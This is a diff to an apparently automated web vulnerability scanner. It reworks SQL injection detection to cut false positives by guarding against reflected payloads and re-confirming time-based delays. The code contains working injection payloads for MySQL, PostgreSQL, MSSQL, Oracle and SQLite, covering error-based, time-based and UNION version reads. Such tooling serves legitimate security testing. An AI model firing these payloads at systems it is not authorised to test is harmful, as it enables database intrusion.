@@ -1336,70 +1336,58 @@ async def sqlmap_test_context(
 
 async def custom_sqli_test(url: str) -> dict:
     """
-    Custom SQL injection detection using proven payloads and response anomaly detection.
-    This catches SQLi that sqlmap might miss due to unusual query structures.
+    DBMS-aware SQL injection detection with reflection-safe response analysis.
+
+    Detection is delegated to the shared ``_check_sqli_response`` engine (the same
+    one the smart scan uses), so a finding is only raised on a high-confidence,
+    low-false-positive signal: a real database error fingerprint, a confirmed
+    time-based delay, an out-of-baseline version/banner read, or a server crash.
+    A reflected payload keyword (e.g. an echoed ``information_schema`` string) is
+    no longer treated as proof. Payloads cover MySQL, PostgreSQL, MSSQL, Oracle
+    and SQLite.
     """
-    findings = []
+    findings: list[dict[str, Any]] = []
     tested = 0
 
-    # Parse URL to get base and parameter
     parsed = urllib.parse.urlparse(url)
     query_params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
 
     if not query_params:
-        return {"findings": [], "tested": 0, "vulnerable": False}
+        return {"findings": [], "tested": 0, "vulnerable": False, "scan_completed": True}
 
-    # SQL error signatures (database-agnostic)
-    sql_error_patterns = [
-        r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySqlException",
-        r"PostgreSQL.*ERROR", r"pg_query", r"PG::Error",
-        r"SQLite3?::SQLException", r"SQLITE_ERROR", r"sqlite3\.OperationalError",
-        r"ORA-\d{5}", r"Oracle.*Driver.*Error",
-        r"Microsoft.*ODBC.*SQL Server", r"SQLServerException", r"\[SQL Server\]",
-        r"SQLSTATE\[\w+\]", r"PDOException", r"Unclosed quotation mark",
-        r"quoted string not properly terminated", r"syntax error at or near",
-        r"SQL command not properly ended", r"unterminated string",
+    # Cross-DBMS payloads. Technique labels are chosen so ``_check_sqli_response``
+    # routes each one to the right detector (it substring-matches on
+    # error/time/version/schema/user/database). Database errors are fingerprinted
+    # for every payload regardless of label.
+    sqli_payloads: list[tuple[str, str]] = [
+        # Error-based: break the query and rely on the DB error fingerprint (all DBMS)
+        ("'", "error_single_quote"),
+        ("')", "error_paren_quote"),
+        ("\"", "error_double_quote"),
+        ("1' ORDER BY 9999-- -", "error_orderby_overflow"),
+        # Time-based blind, per major DBMS (confirmed with a re-test before reporting)
+        ("' AND SLEEP(2)-- -", "time_mysql"),
+        ("' AND (SELECT 1 FROM (SELECT SLEEP(2))a)-- -", "time_mysql_subquery"),
+        ("'; SELECT pg_sleep(2)-- ", "time_postgresql"),
+        ("' AND 1=(SELECT 1 FROM PG_SLEEP(2))-- ", "time_postgresql_inline"),
+        ("'; WAITFOR DELAY '0:0:2'-- ", "time_mssql"),
+        ("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',2)-- ", "time_oracle"),
+        # Version/banner read (proof of injection); reflection-guarded
+        ("' UNION SELECT NULL,@@version,NULL-- -", "version_mysql_mssql"),
+        ("' UNION SELECT NULL,version(),NULL-- ", "version_postgresql"),
+        ("' UNION SELECT NULL,banner,NULL FROM v$version WHERE ROWNUM=1-- ", "version_oracle"),
+        ("')) UNION SELECT 1,sqlite_version(),3,4,5,6,7,8,9 FROM sqlite_master-- ", "version_sqlite"),
     ]
 
-    # Schema/data leak signatures (indicates successful injection)
-    leak_patterns = [
-        r"CREATE\s+TABLE", r"CREATE\s+INDEX", r"sqlite_master", r"information_schema",
-        r"sys\.tables", r"pg_catalog", r"mysql\.user", r"sysobjects",
-        # User data leak indicators
-        r'"password"\s*:', r'"email"\s*:', r"password.*=", r"hash.*=",
-        r"BEGIN\s+TRANSACTION", r"COMMIT", r"ROLLBACK",
-    ]
-
-    # Proven SQLi payloads (ordered by likelihood of success)
-    sqli_payloads = [
-        # Juice Shop specific (SQLite with nested parentheses)
-        ("'))--", "double_paren_close"),
-        ("'))/*", "double_paren_comment"),
-        ("')) OR 1=1--", "double_paren_bool"),
-        ("')) UNION SELECT NULL--", "double_paren_union"),
-
-        # Standard payloads
-        ("'--", "single_quote"),
-        ("' OR '1'='1", "or_true"),
-        ("' OR 1=1--", "or_true_comment"),
-        ("\" OR 1=1--", "dquote_or"),
-        ("1' AND '1'='1", "and_true"),
-        ("1' AND '1'='2", "and_false"),
-
-        # UNION-based (for data extraction detection)
-        ("' UNION SELECT NULL--", "union_null"),
-        ("' UNION SELECT 1,2,3--", "union_nums"),
-        ("')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--", "union_schema"),
-
-        # Time-based blind (response time detection)
-        ("' OR SLEEP(2)--", "time_mysql"),
-        ("'; WAITFOR DELAY '0:0:2'--", "time_mssql"),
-        ("' OR (SELECT * FROM (SELECT(SLEEP(2)))a)--", "time_subquery"),
-
-        # Error-based
-        ("' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--", "error_extractvalue"),
-        ("' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--", "error_groupby"),
-    ]
+    # Only these evidence categories are trustworthy enough to raise a finding
+    # from an unauthenticated, unverified full scan. Boolean/size-only deltas are
+    # intentionally treated as too weak to report here to avoid false positives.
+    strong_evidence_markers = (
+        "SQL error detected",
+        "Time-based delay",
+        "Data extraction indicator",
+        "Server crash indicator",
+    )
 
     async def get_response(test_url: str) -> tuple[str, int, float]:
         """Fetch URL and return (body, status_code, response_time)."""
@@ -1423,87 +1411,69 @@ async def custom_sqli_test(url: str) -> dict:
             status = 200
         return body, status, elapsed
 
-    # Get baseline response for each parameter
+    async def _evaluate(
+        param_name: str, original_value: str, payload: str, payload_type: str,
+        baseline_body: str, baseline_len: int, baseline_status: int, baseline_time: float,
+    ) -> tuple[str, str, bool, list[str]]:
+        """Inject one payload and run it through the shared SQLi response engine."""
+        nonlocal tested
+        test_params = {k: list(v) for k, v in query_params.items()}
+        test_params[param_name] = [original_value + payload]
+        test_query = urllib.parse.urlencode(test_params, doseq=True)
+        test_url = urllib.parse.urlunparse(parsed._replace(query=test_query))
+
+        test_body, test_status, test_time = await get_response(test_url)
+        tested += 1
+
+        is_vuln, evidence = _check_sqli_response(
+            test_body, baseline_len, test_time, payload_type,
+            dbms_detected=None, status_code=test_status,
+            baseline_status=baseline_status, baseline_elapsed=baseline_time,
+            baseline_body=baseline_body, payload=payload,
+        )
+        return test_url, test_body, is_vuln, evidence
+
     for param_name in query_params:
         original_value = query_params[param_name][0] if query_params[param_name] else "test"
 
-        # Get baseline
         baseline_body, baseline_status, baseline_time = await get_response(url)
         baseline_len = len(baseline_body)
 
-        # Test each payload
         for payload, payload_type in sqli_payloads:
-            tested += 1
+            test_url, test_body, is_vuln, evidence = await _evaluate(
+                param_name, original_value, payload, payload_type,
+                baseline_body, baseline_len, baseline_status, baseline_time,
+            )
+            if not is_vuln:
+                continue
 
-            # Build test URL
-            test_params = query_params.copy()
-            test_params[param_name] = [original_value + payload]
-            test_query = urllib.parse.urlencode(test_params, doseq=True)
-            test_url = urllib.parse.urlunparse(parsed._replace(query=test_query))
+            strong = [e for e in evidence if any(m in e for m in strong_evidence_markers)]
+            if not strong:
+                continue  # weak/ambiguous signal only — skip to avoid false positives
 
-            # Get response
-            test_body, test_status, test_time = await get_response(test_url)
-            test_len = len(test_body)
+            # Confirm a purely time-based hit with a second request to rule out
+            # network jitter before reporting it.
+            if "time" in payload_type and all("Time-based delay" in e for e in strong):
+                _, _, confirm_vuln, confirm_ev = await _evaluate(
+                    param_name, original_value, payload, payload_type,
+                    baseline_body, baseline_len, baseline_status, baseline_time,
+                )
+                if not (confirm_vuln and any("Time-based delay" in e for e in confirm_ev)):
+                    continue
 
-            vulnerability_detected = False
-            evidence = []
-            severity = "medium"
-
-            # Check for SQL errors (indicates injectable but might be filtered)
-            for pattern in sql_error_patterns:
-                if re.search(pattern, test_body, re.IGNORECASE):
-                    vulnerability_detected = True
-                    evidence.append(f"SQL error: {pattern}")
-                    severity = "high"
-                    break
-
-            # Check for data/schema leak (indicates successful exploitation)
-            for pattern in leak_patterns:
-                if re.search(pattern, test_body, re.IGNORECASE) and not re.search(pattern, baseline_body, re.IGNORECASE):
-                    vulnerability_detected = True
-                    evidence.append(f"Data leak: {pattern}")
-                    severity = "critical"
-                    break
-
-            # Response length anomaly (significant change suggests injection worked)
-            if not vulnerability_detected and baseline_len > 0:
-                len_diff = abs(test_len - baseline_len)
-                len_ratio = len_diff / baseline_len if baseline_len else 0
-
-                # Significant length change (>50% or >1000 chars difference)
-                if len_ratio > 0.5 or len_diff > 1000:
-                    # Additional verification: check if response contains extra data
-                    if test_len > baseline_len * 1.5:
-                        vulnerability_detected = True
-                        evidence.append(f"Response length anomaly: {baseline_len} -> {test_len} ({len_diff:+d})")
-                        severity = "high"
-
-            # Time-based detection (response significantly slower)
-            if not vulnerability_detected and "time" in payload_type:
-                if test_time > baseline_time + 1.5:  # 1.5 seconds slower
-                    vulnerability_detected = True
-                    evidence.append(f"Time-based: {baseline_time:.2f}s -> {test_time:.2f}s")
-                    severity = "high"
-
-            # Boolean-based detection (different responses for true/false)
-            if not vulnerability_detected and ("true" in payload_type or "false" in payload_type):
-                # Compare with baseline - significant content difference
-                if test_len != baseline_len and abs(test_len - baseline_len) > 100:
-                    # This could be boolean-based, mark for review
-                    pass  # Needs true/false pair comparison, skip for now
-
-            if vulnerability_detected:
-                findings.append({
-                    "type": "SQL Injection",
-                    "url": test_url,
-                    "parameter": param_name,
-                    "payload": payload,
-                    "payload_type": payload_type,
-                    "evidence": evidence,
-                    "severity": severity,
-                    "baseline_length": baseline_len,
-                    "response_length": test_len,
-                })
+            severity = "critical" if any("Data extraction indicator" in e for e in strong) else "high"
+            findings.append({
+                "type": "SQL Injection",
+                "url": test_url,
+                "parameter": param_name,
+                "payload": payload,
+                "payload_type": payload_type,
+                "evidence": strong,
+                "severity": severity,
+                "baseline_length": baseline_len,
+                "response_length": len(test_body),
+            })
+            break  # one confirmed SQLi per parameter is enough
 
     return {
         "findings": findings,
@@ -5892,6 +5862,7 @@ async def smart_sqli_test(
                     baseline_status=baseline_status,
                     baseline_elapsed=baseline_elapsed,
                     baseline_body=baseline_body,
+                    payload=payload,
                 )
 
                 if is_vulnerable:
@@ -6051,6 +6022,7 @@ async def smart_sqli_test(
                     baseline_elapsed=baseline_elapsed,
                     baseline_body=baseline_body_out,
                     true_condition_len=true_condition_len,
+                    payload=payload,
                 )
 
                 if is_vulnerable:
@@ -6480,8 +6452,14 @@ def _check_sqli_response(
     baseline_elapsed: float | None = None,
     baseline_body: str | None = None,
     true_condition_len: int | None = None,
+    payload: str | None = None,
 ) -> tuple[bool, list[str]]:
     """Check response for SQLi indicators with enhanced blind SQLi heuristics.
+
+    When ``payload`` is provided, schema/version extraction keywords that also
+    appear in the injected payload are ignored: an echoed ``information_schema``
+    (or any other reflected SQL keyword) is reflection, not exfiltrated data, and
+    must not be counted as proof.
 
     Returns:
         Tuple of (is_vulnerable, evidence_list)
@@ -6599,6 +6577,12 @@ def _check_sqli_response(
             ])
         for pattern in extraction_patterns:
             if re.search(pattern, out or "", re.I) and not re.search(pattern, baseline_body or "", re.I):
+                # Reflected-payload guard: if our injected payload itself contains
+                # this token, a match in the response is just the echo of our
+                # payload (e.g. an error page printing the query), not data the
+                # database returned. Skip it.
+                if payload and re.search(pattern, payload, re.I):
+                    continue
                 strong_signal = True
                 evidence.append(f"Data extraction indicator: {pattern}")
                 break
